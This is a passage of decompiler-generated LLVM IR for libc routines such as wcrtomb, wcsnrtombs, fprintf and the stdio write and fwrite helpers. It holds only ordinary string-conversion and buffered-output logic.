  ret i32 ptrtoint (i32* @global_var_1002b95c.795 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10010648 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_10010664 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10010664, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10010648, label %dec_label_pc_10010670, label %dec_label_pc_10010678

dec_label_pc_10010670:                            ; preds = %entry
  %v2_10010670 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10010670, i32* @r3, align 4
  br label %dec_label_pc_10010678

dec_label_pc_10010678:                            ; preds = %entry, %dec_label_pc_10010670
  %v0_1001067c = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10010670 ]
  %v2_10010678 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1001067c, i32* %stack_var_-40, align 4
  store i32 %v2_10010678, i32* %stack_var_-36, align 4
  store i32 268502664, i32* @lr, align 4
  %v0_10010684 = call i32 @__GI_wcsnrtombs()
  %v3_10010688 = icmp eq i32 %v0_10010684, 0
  br i1 %v3_10010688, label %dec_label_pc_10010690, label %dec_label_pc_10010694

dec_label_pc_10010690:                            ; preds = %dec_label_pc_10010678
  br label %dec_label_pc_10010694

dec_label_pc_10010694:                            ; preds = %dec_label_pc_10010678, %dec_label_pc_10010690
  %v0_100106a0 = phi i32 [ %v0_10010684, %dec_label_pc_10010678 ], [ 1, %dec_label_pc_10010690 ]
  ret i32 %v0_100106a0

; uselistorder directives
  uselistorder label %dec_label_pc_10010694, { 1, 0 }
  uselistorder label %dec_label_pc_10010678, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_100106a4 = load i32, i32* @r6, align 4
  store i32 %v0_100106a4, i32* @r7, align 4
  %v0_100106a8 = load i32, i32* @r5, align 4
  store i32 %v0_100106a8, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100106b0 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_100106b0

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100106b4 = load i32, i32* @r3, align 4
  %v3_100106b4 = icmp eq i32 %v0_100106b4, 0
  %v0_100106b8 = load i32, i32* @lr, align 4
  store i32 %v0_100106b8, i32* %r0.global-to-local, align 4
  br i1 %v3_100106b4, label %dec_label_pc_100106e0, label %dec_label_pc_100106c8

dec_label_pc_100106c8:                            ; preds = %entry
  %v1_100106c8 = load i32, i32* @r4, align 4
  %v4_100106c8 = icmp eq i32 %v0_100106b4, %v1_100106c8
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_100106c8, label %dec_label_pc_100106d4, label %dec_label_pc_1001070c

dec_label_pc_100106d4:                            ; preds = %dec_label_pc_100106c8
  %v2_100106d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100106d8, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001070c

dec_label_pc_100106e0:                            ; preds = %entry
  %v2_100106d811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100106d811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1001070c

dec_label_pc_100106ec:                            ; preds = %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge, %dec_label_pc_1001072c.preheader
  %v0_100106ec = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_100106f8 = inttoptr i32 %v0_100106ec to i32*
  store i32 84, i32* %v2_100106f8, align 4
  %v0_10010770.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001076c

dec_label_pc_10010700:                            ; preds = %dec_label_pc_1001073c
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001075c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010758

dec_label_pc_1001070c:                            ; preds = %dec_label_pc_100106d4, %dec_label_pc_100106c8, %dec_label_pc_100106e0
  %v2_1001073c7 = phi i32 [ %v2_100106d8, %dec_label_pc_100106d4 ], [ %v0_100106b4, %dec_label_pc_100106c8 ], [ %v2_100106d811, %dec_label_pc_100106e0 ]
  %v0_1001070c = load i32, i32* @r5, align 4
  %v1_1001070c = load i32, i32* @r6, align 4
  %v3_1001070c = icmp ugt i32 %v0_1001070c, %v1_1001070c
  br i1 %v3_1001070c, label %dec_label_pc_10010714, label %dec_label_pc_10010718

dec_label_pc_10010714:                            ; preds = %dec_label_pc_1001070c
  store i32 %v1_1001070c, i32* @r5, align 4
  br label %dec_label_pc_10010718

dec_label_pc_10010718:                            ; preds = %dec_label_pc_1001070c, %dec_label_pc_10010714
  %v0_10010724 = phi i32 [ %v0_1001070c, %dec_label_pc_1001070c ], [ %v1_1001070c, %dec_label_pc_10010714 ]
  %v1_10010718 = add i32 %v0_10010724, 1
  store i32 %v1_10010718, i32* %r0.global-to-local, align 4
  %v0_1001071c = load i32, i32* @r4, align 4
  %v1_1001071c = inttoptr i32 %v0_1001071c to i32*
  %v2_1001071c = load i32, i32* %v1_1001071c, align 4
  store i32 %v2_1001071c, i32* %r11.global-to-local, align 4
  store i32 %v0_10010724, i32* %r9.global-to-local, align 4
  store i32 %v0_10010724, i32* %ctr.global-to-local, align 4
  %v2_100107543 = icmp eq i32 %v0_10010724, 0
  br i1 %v2_100107543, label %dec_label_pc_10010758, label %dec_label_pc_1001072c.preheader

dec_label_pc_1001072c.preheader:                  ; preds = %dec_label_pc_10010718
  %v1_1001072c16 = inttoptr i32 %v2_1001071c to i32*
  %v2_1001072c17 = load i32, i32* %v1_1001072c16, align 4
  store i32 %v2_1001072c17, i32* %r0.global-to-local, align 4
  %v1_1001073018 = add i32 %v2_1001071c, 4
  store i32 %v1_1001073018, i32* %r11.global-to-local, align 4
  %v2_1001073420 = icmp ugt i32 %v2_1001072c17, 127
  br i1 %v2_1001073420, label %dec_label_pc_100106ec, label %dec_label_pc_1001073c.lr.ph

dec_label_pc_1001073c.lr.ph:                      ; preds = %dec_label_pc_1001072c.preheader
  %extract.t = trunc i32 %v2_1001072c17 to i8
  br label %dec_label_pc_1001073c

dec_label_pc_1001073c:                            ; preds = %dec_label_pc_1001073c.lr.ph, %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge
  %v2_1001072c23.off0 = phi i8 [ %extract.t, %dec_label_pc_1001073c.lr.ph ], [ %extract.t24, %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge ]
  %v2_1001073c22 = phi i32 [ %v2_1001073c7, %dec_label_pc_1001073c.lr.ph ], [ %v2_1001074c, %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge ]
  %v3_1001073c = inttoptr i32 %v2_1001073c22 to i8*
  store i8 %v2_1001072c23.off0, i8* %v3_1001073c, align 1
  %v0_10010740 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010740 = urem i32 %v0_10010740, 256
  store i32 %v1_10010740, i32* %r0.global-to-local, align 4
  %v3_10010744 = icmp eq i32 %v1_10010740, 0
  br i1 %v3_10010744, label %dec_label_pc_10010700, label %dec_label_pc_1001074c

dec_label_pc_1001074c:                            ; preds = %dec_label_pc_1001073c
  %v0_1001074c = load i32, i32* @r3, align 4
  %v1_1001074c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001074c = add i32 %v1_1001074c, %v0_1001074c
  store i32 %v2_1001074c, i32* @r3, align 4
  %v0_10010750 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010750 = add i32 %v0_10010750, -1
  store i32 %v1_10010750, i32* %r9.global-to-local, align 4
  %v0_10010754 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010754 = add i32 %v0_10010754, -1
  store i32 %v1_10010754, i32* %ctr.global-to-local, align 4
  %v2_10010754 = icmp eq i32 %v1_10010754, 0
  br i1 %v2_10010754, label %dec_label_pc_10010758, label %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge

dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge: ; preds = %dec_label_pc_1001074c
  %v0_1001072c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1001072c = inttoptr i32 %v0_1001072c.pre to i32*
  %v2_1001072c = load i32, i32* %v1_1001072c, align 4
  store i32 %v2_1001072c, i32* %r0.global-to-local, align 4
  %v1_10010730 = add i32 %v0_1001072c.pre, 4
  store i32 %v1_10010730, i32* %r11.global-to-local, align 4
  %v2_10010734 = icmp ugt i32 %v2_1001072c, 127
  %extract.t24 = trunc i32 %v2_1001072c to i8
  br i1 %v2_10010734, label %dec_label_pc_100106ec, label %dec_label_pc_1001073c

dec_label_pc_10010758:                            ; preds = %dec_label_pc_1001074c, %dec_label_pc_10010718, %dec_label_pc_10010700
  %v0_1001075c = phi i32 [ %v0_1001075c.pre, %dec_label_pc_10010700 ], [ %v2_1001073c7, %dec_label_pc_10010718 ], [ %v2_1001074c, %dec_label_pc_1001074c ]
  %v2_10010758 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10010758, i32* %r0.global-to-local, align 4
  %v4_1001075c = icmp eq i32 %v0_1001075c, %v2_10010758
  br i1 %v4_1001075c, label %dec_label_pc_10010768, label %dec_label_pc_10010764

dec_label_pc_10010764:                            ; preds = %dec_label_pc_10010758
  %v0_10010764 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010764 = load i32, i32* @r4, align 4
  %v2_10010764 = inttoptr i32 %v1_10010764 to i32*
  store i32 %v0_10010764, i32* %v2_10010764, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010768:                            ; preds = %dec_label_pc_10010758, %dec_label_pc_10010764
  %v0_10010768 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010768 = load i32, i32* @r5, align 4
  %v2_10010768 = sub i32 %v1_10010768, %v0_10010768
  store i32 %v2_10010768, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001076c

dec_label_pc_1001076c:                            ; preds = %dec_label_pc_100106ec, %dec_label_pc_10010768
  %v0_10010770 = phi i32 [ %v0_10010770.pre, %dec_label_pc_100106ec ], [ %v2_10010768, %dec_label_pc_10010768 ]
  store i32 %v0_100106b8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010770

; uselistorder directives
  uselistorder i32 %v1_10010754, { 1, 0 }
  uselistorder i32 %v2_1001074c, { 0, 2, 1 }
  uselistorder i32 %v1_10010740, { 1, 0 }
  uselistorder i32 %v0_10010724, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1001073c7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 6, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1001076c, { 1, 0 }
  uselistorder label %dec_label_pc_10010768, { 1, 0 }
  uselistorder label %dec_label_pc_1001073c, { 1, 0 }
  uselistorder label %dec_label_pc_10010718, { 1, 0 }
  uselistorder label %dec_label_pc_1001070c, { 2, 0, 1 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_1001078c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1001078c, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_100107e4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_100107e4, i32* %stack_var_-96, align 4
  store i32 268503024, i32* @lr, align 4
  %v0_100107ec = call i32 @__GI_vfprintf()
  ret i32 %v0_100107ec
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10010800 = load i32, i32* @lr, align 4
  store i32 %v0_10010800, i32* %r0.global-to-local, align 4
  %v0_1001080c = load i32, i32* @r5, align 4
  store i32 %v0_1001080c, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1001080c, i32* @r31, align 4
  %v3_100108203 = icmp eq i32 %v0_1001080c, 0
  store i32 %v0_1001080c, i32* @r27, align 4
  br i1 %v3_100108203, label %dec_label_pc_100108c8, label %dec_label_pc_10010830

dec_label_pc_10010830:                            ; preds = %entry, %dec_label_pc_10010850
  %v0_10010840 = phi i32 [ %v2_10010850, %dec_label_pc_10010850 ], [ %arg2, %entry ]
  %v1_10010830.in = phi i32 [ %v2_10010854, %dec_label_pc_10010850 ], [ %v0_1001080c, %entry ]
  %v1_10010830 = icmp sgt i32 %v1_10010830.in, 0
  br i1 %v1_10010830, label %dec_label_pc_1001083c, label %dec_label_pc_10010834

dec_label_pc_10010834:                            ; preds = %dec_label_pc_10010830
  br label %dec_label_pc_1001083c

dec_label_pc_1001083c:                            ; preds = %dec_label_pc_10010830, %dec_label_pc_10010834
  %v0_1001083c = load i32, i32* @r30, align 4
  %v1_1001083c = add i32 %v0_1001083c, 4
  %v2_1001083c = inttoptr i32 %v1_1001083c to i32*
  %v3_1001083c = load i32, i32* %v2_1001083c, align 4
  store i32 268503112, i32* @lr, align 4
  %v3_10010844 = call i32 @__libc_write(i32 %v3_1001083c, i32 %v0_10010840)
  %v1_10010848 = icmp slt i32 %v3_10010844, 0
  br i1 %v1_10010848, label %dec_label_pc_1001085c, label %dec_label_pc_10010850

dec_label_pc_10010850:                            ; preds = %dec_label_pc_1001083c
  %v0_10010850 = load i32, i32* @r29, align 4
  %v2_10010850 = add i32 %v0_10010850, %v3_10010844
  store i32 %v2_10010850, i32* @r29, align 4
  %v1_10010854 = load i32, i32* @r31, align 4
  %v2_10010854 = sub i32 %v1_10010854, %v3_10010844
  store i32 %v2_10010854, i32* @r31, align 4
  %v3_10010820 = icmp eq i32 %v2_10010854, 0
  store i32 %v2_10010854, i32* @r27, align 4
  br i1 %v3_10010820, label %dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge, label %dec_label_pc_10010830

dec_label_pc_1001085c:                            ; preds = %dec_label_pc_1001083c
  %v0_1001085c = load i32, i32* @r30, align 4
  %v1_1001085c = add i32 %v0_1001085c, 8
  %v2_1001085c = inttoptr i32 %v1_1001085c to i32*
  %v3_1001085c = load i32, i32* %v2_1001085c, align 4
  store i32 %v3_1001085c, i32* %r11.global-to-local, align 4
  %v1_10010860 = add i32 %v0_1001085c, 12
  %v2_10010860 = inttoptr i32 %v1_10010860 to i32*
  %v3_10010860 = load i32, i32* %v2_10010860, align 4
  store i32 %v3_10010860, i32* %r0.global-to-local, align 4
  %v1_10010864 = inttoptr i32 %v0_1001085c to i16*
  %v2_10010864 = load i16, i16* %v1_10010864, align 2
  %v2_10010868 = sub i32 %v3_10010860, %v3_1001085c
  store i32 %v2_10010868, i32* %r0.global-to-local, align 4
  %v5_10010868 = icmp eq i32 %v2_10010868, 0
  %v1_1001086c = or i16 %v2_10010864, 8
  store i16 %v1_1001086c, i16* %v1_10010864, align 2
  br i1 %v5_10010868, label %dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge, label %dec_label_pc_10010878

dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge: ; preds = %dec_label_pc_1001085c
  %v0_100108c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100108c4

dec_label_pc_10010878:                            ; preds = %dec_label_pc_1001085c
  %v0_10010878 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010878 = load i32, i32* @r31, align 4
  %v3_10010878 = icmp ugt i32 %v0_10010878, %v1_10010878
  br i1 %v3_10010878, label %dec_label_pc_10010878.dec_label_pc_10010884_crit_edge, label %dec_label_pc_10010880

dec_label_pc_10010878.dec_label_pc_10010884_crit_edge: ; preds = %dec_label_pc_10010878
  %v0_10010884.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10010884

dec_label_pc_10010880:                            ; preds = %dec_label_pc_10010878
  store i32 %v0_10010878, i32* @r27, align 4
  br label %dec_label_pc_10010884

dec_label_pc_10010884:                            ; preds = %dec_label_pc_10010878.dec_label_pc_10010884_crit_edge, %dec_label_pc_10010880
  %v0_10010884 = phi i32 [ %v0_10010884.pre, %dec_label_pc_10010878.dec_label_pc_10010884_crit_edge ], [ %v0_10010878, %dec_label_pc_10010880 ]
  store i32 %v0_10010884, i32* %ctr.global-to-local, align 4
  %v2_10010890.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010888

dec_label_pc_10010888:                            ; preds = %dec_label_pc_100108ac, %dec_label_pc_10010884
  %v2_10010890 = phi i32 [ %v1_100108ac, %dec_label_pc_100108ac ], [ %v2_10010890.pre, %dec_label_pc_10010884 ]
  %v0_10010888 = load i32, i32* @r29, align 4
  %v1_10010888 = inttoptr i32 %v0_10010888 to i8*
  %v2_10010888 = load i8, i8* %v1_10010888, align 1
  %v3_10010888 = zext i8 %v2_10010888 to i32
  store i32 %v3_10010888, i32* %r0.global-to-local, align 4
  %v1_1001088c = add i32 %v0_10010888, 1
  store i32 %v1_1001088c, i32* @r29, align 4
  %v3_10010890 = inttoptr i32 %v2_10010890 to i8*
  store i8 %v2_10010888, i8* %v3_10010890, align 1
  %v0_10010894 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010894 = urem i32 %v0_10010894, 256
  store i32 %v1_10010894, i32* %r0.global-to-local, align 4
  %v3_10010898 = icmp eq i32 %v1_10010894, 10
  br i1 %v3_10010898, label %dec_label_pc_100108a0, label %dec_label_pc_100108ac

dec_label_pc_100108a0:                            ; preds = %dec_label_pc_10010888
  %v0_100108a0 = load i32, i32* @r30, align 4
  %v1_100108a0 = inttoptr i32 %v0_100108a0 to i16*
  %v2_100108a0 = load i16, i16* %v1_100108a0, align 2
  %v3_100108a0 = zext i16 %v2_100108a0 to i32
  store i32 %v3_100108a0, i32* %r0.global-to-local, align 4
  %v1_100108a4 = and i32 %v3_100108a0, 256
  %v3_100108a4 = icmp eq i32 %v1_100108a4, 0
  br i1 %v3_100108a4, label %dec_label_pc_100108ac, label %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge

dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge: ; preds = %dec_label_pc_100108a0
  %v0_100108b8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100108b4

dec_label_pc_100108ac:                            ; preds = %dec_label_pc_100108a0, %dec_label_pc_10010888
  %v0_100108ac = load i32, i32* %r11.global-to-local, align 4
  %v1_100108ac = add i32 %v0_100108ac, 1
  store i32 %v1_100108ac, i32* %r11.global-to-local, align 4
  %v0_100108b0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100108b0 = add i32 %v0_100108b0, -1
  store i32 %v1_100108b0, i32* %ctr.global-to-local, align 4
  %v2_100108b0 = icmp eq i32 %v1_100108b0, 0
  br i1 %v2_100108b0, label %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge, label %dec_label_pc_10010888

dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge: ; preds = %dec_label_pc_100108ac
  %v0_100108b4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100108b4

dec_label_pc_100108b4:                            ; preds = %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge, %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge
  %v0_100108b8 = phi i32 [ %v1_100108ac, %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge ], [ %v0_100108b8.pre, %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge ]
  %v0_100108b4 = phi i32 [ %v0_100108b4.pre, %dec_label_pc_100108ac.dec_label_pc_100108b4_crit_edge ], [ %v0_100108a0, %dec_label_pc_100108a0.dec_label_pc_100108b4_crit_edge ]
  %v1_100108b4 = add i32 %v0_100108b4, 8
  %v2_100108b4 = inttoptr i32 %v1_100108b4 to i32*
  %v3_100108b4 = load i32, i32* %v2_100108b4, align 4
  store i32 %v3_100108b4, i32* %r0.global-to-local, align 4
  %v2_100108b8 = add i32 %v0_100108b4, 16
  %v3_100108b8 = inttoptr i32 %v2_100108b8 to i32*
  store i32 %v0_100108b8, i32* %v3_100108b8, align 4
  %v0_100108bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100108bc = load i32, i32* %r11.global-to-local, align 4
  %v2_100108bc = sub i32 %v1_100108bc, %v0_100108bc
  store i32 %v2_100108bc, i32* %r0.global-to-local, align 4
  %v1_100108c0 = load i32, i32* @r31, align 4
  %v2_100108c0 = sub i32 %v1_100108c0, %v2_100108bc
  store i32 %v2_100108c0, i32* @r31, align 4
  br label %dec_label_pc_100108c4

dec_label_pc_100108c4:                            ; preds = %dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge, %dec_label_pc_100108b4
  %v0_100108c4 = phi i32 [ %v0_100108c4.pre, %dec_label_pc_1001085c.dec_label_pc_100108c4_crit_edge ], [ %v2_100108c0, %dec_label_pc_100108b4 ]
  %v1_100108c4 = load i32, i32* @r28, align 4
  %v2_100108c4 = sub i32 %v1_100108c4, %v0_100108c4
  store i32 %v2_100108c4, i32* @r28, align 4
  br label %dec_label_pc_100108c8

dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge: ; preds = %dec_label_pc_10010850
  %v0_100108cc.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100108c8

dec_label_pc_100108c8:                            ; preds = %entry, %dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge, %dec_label_pc_100108c4
  %v0_100108cc = phi i32 [ %v2_100108c4, %dec_label_pc_100108c4 ], [ %v0_100108cc.pre.pre, %dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_10010800, i32* %r0.global-to-local, align 4
  ret i32 %v0_100108cc

; uselistorder directives
  uselistorder i32 %v0_100108b4, { 1, 0 }
  uselistorder i32 %v1_100108b0, { 1, 0 }
  uselistorder i32 %v1_100108ac, { 0, 2, 1 }
  uselistorder i32 %v1_10010894, { 1, 0 }
  uselistorder i32 %v2_10010854, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10010850, { 1, 0 }
  uselistorder i32 %v3_10010844, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_100108c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100108c4, { 1, 0 }
  uselistorder label %dec_label_pc_100108b4, { 1, 0 }
  uselistorder label %dec_label_pc_10010884, { 1, 0 }
  uselistorder label %dec_label_pc_1001083c, { 1, 0 }
  uselistorder label %dec_label_pc_10010830, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_100108e0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100108fc = load i16, i16* %arg3, align 2
  %v1_10010900 = and i16 %v3_100108fc, 512
  %v3_10010900 = icmp eq i16 %v1_10010900, 0
  br i1 %v3_10010900, label %dec_label_pc_10010908, label %dec_label_pc_10010a14

dec_label_pc_10010908:                            ; preds = %entry
  %v2_10010908 = add i32 %tmp, 4
  %v3_10010908 = inttoptr i32 %v2_10010908 to i32*
  %v4_10010908 = load i32, i32* %v3_10010908, align 4
  %v2_1001090c = add i32 %tmp, 16
  %v3_1001090c = inttoptr i32 %v2_1001090c to i32*
  %v4_1001090c = load i32, i32* %v3_1001090c, align 4
  store i32 %v4_1001090c, i32* @r3, align 4
  %v3_10010910 = icmp eq i32 %v4_10010908, -2
  %v2_10010914 = add i32 %tmp, 12
  %v3_10010914 = inttoptr i32 %v2_10010914 to i32*
  %v4_10010914 = load i32, i32* %v3_10010914, align 4
  %v2_1001091c = sub i32 %v4_10010914, %v4_1001090c
  br i1 %v3_10010910, label %dec_label_pc_1001091c, label %dec_label_pc_1001094c

dec_label_pc_1001091c:                            ; preds = %dec_label_pc_10010908
  %v3_10010924 = icmp ult i32 %v2_1001091c, %arg2
  br i1 %v3_10010924, label %dec_label_pc_1001092c, label %dec_label_pc_10010930

dec_label_pc_1001092c:                            ; preds = %dec_label_pc_1001091c
  br label %dec_label_pc_10010930

dec_label_pc_10010930:                            ; preds = %dec_label_pc_1001091c, %dec_label_pc_1001092c
  %storemerge = phi i32 [ %v2_1001091c, %dec_label_pc_1001092c ], [ %arg2, %dec_label_pc_1001091c ]
  %v0_10010934 = phi i32 [ %v2_1001091c, %dec_label_pc_1001092c ], [ %arg2, %dec_label_pc_1001091c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10010934, i32* @r5, align 4
  store i32 268503356, i32* @lr, align 4
  %v0_10010938 = call i32 @memcpy()
  %v0_1001093c = load i32, i32* @r30, align 4
  %v1_1001093c = add i32 %v0_1001093c, 16
  %v2_1001093c = inttoptr i32 %v1_1001093c to i32*
  %v3_1001093c = load i32, i32* %v2_1001093c, align 4
  %v1_10010940 = load i32, i32* @r31, align 4
  %v2_10010940 = add i32 %v1_10010940, %v3_1001093c
  store i32 %v2_10010940, i32* %v2_1001093c, align 4
  br label %dec_label_pc_10010a34

dec_label_pc_1001094c:                            ; preds = %dec_label_pc_10010908
  %v3_10010950 = icmp ult i32 %v2_1001091c, %arg2
  br i1 %v3_10010950, label %dec_label_pc_100109f0, label %dec_label_pc_10010958

dec_label_pc_10010958:                            ; preds = %dec_label_pc_1001094c
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268503396, i32* @lr, align 4
  %v0_10010960 = call i32 @memcpy()
  %v0_10010964 = load i32, i32* @r30, align 4
  %v1_10010964 = inttoptr i32 %v0_10010964 to i16*
  %v2_10010964 = load i16, i16* %v1_10010964, align 2
  %v1_10010968 = add i32 %v0_10010964, 16
  %v2_10010968 = inttoptr i32 %v1_10010968 to i32*
  %v3_10010968 = load i32, i32* %v2_10010968, align 4
  %v1_1001096c = and i16 %v2_10010964, 256
  %v3_1001096c = icmp eq i16 %v1_1001096c, 0
  %v1_10010970 = load i32, i32* @r29, align 4
  %v2_10010970 = add i32 %v1_10010970, %v3_10010968
  store i32 %v2_10010970, i32* %v2_10010968, align 4
  br i1 %v3_1001096c, label %dec_label_pc_10010a34, label %dec_label_pc_1001097c

dec_label_pc_1001097c:                            ; preds = %dec_label_pc_10010958
  %v0_1001097c = load i32, i32* @r28, align 4
  %v0_10010984 = load i32, i32* @r29, align 4
  store i32 268503436, i32* @lr, align 4
  %v4_10010988 = call i32 @memrchr(i32 %v0_1001097c, i32 10, i32 %v0_10010984, i32 %v2_10010970)
  %v3_1001098c = icmp eq i32 %v4_10010988, 0
  br i1 %v3_1001098c, label %dec_label_pc_10010a34, label %dec_label_pc_10010994

dec_label_pc_10010994:                            ; preds = %dec_label_pc_1001097c
  %v0_10010994 = load i32, i32* @r30, align 4
  store i32 %v0_10010994, i32* @r3, align 4
  store i32 268503452, i32* @lr, align 4
  %v0_10010998 = call i32 @__stdio_wcommit()
  %v3_1001099c = icmp eq i32 %v0_10010998, 0
  br i1 %v3_1001099c, label %dec_label_pc_10010a34, label %dec_label_pc_100109a4

dec_label_pc_100109a4:                            ; preds = %dec_label_pc_10010994
  %v0_100109a4 = load i32, i32* @r29, align 4
  %v3_100109a4 = icmp ugt i32 %v0_100109a4, %v0_10010998
  %v0_10010998.v0_100109a8 = select i1 %v3_100109a4, i32 %v0_10010998, i32 %v0_100109a4
  store i32 %v0_10010998.v0_100109a8, i32* @r31, align 4
  %v2_100109b4 = sub i32 %v0_100109a4, %v0_10010998.v0_100109a8
  %v0_100109bc = load i32, i32* @r28, align 4
  %v2_100109bc = add i32 %v0_100109bc, %v2_100109b4
  store i32 %v2_100109bc, i32* @r28, align 4
  store i32 %v2_100109bc, i32* @r3, align 4
  store i32 268503500, i32* @lr, align 4
  %v3_100109c8 = call i32 @__GI_memchr(i32 %v2_100109bc, i32 10, i32 %v0_10010998.v0_100109a8)
  %v3_100109cc = icmp eq i32 %v3_100109c8, 0
  br i1 %v3_100109cc, label %dec_label_pc_10010a34, label %dec_label_pc_100109d4

dec_label_pc_100109d4:                            ; preds = %dec_label_pc_100109a4
  %v0_100109d4 = load i32, i32* @r30, align 4
  %v1_100109d4 = add i32 %v0_100109d4, 16
  %v2_100109d4 = inttoptr i32 %v1_100109d4 to i32*
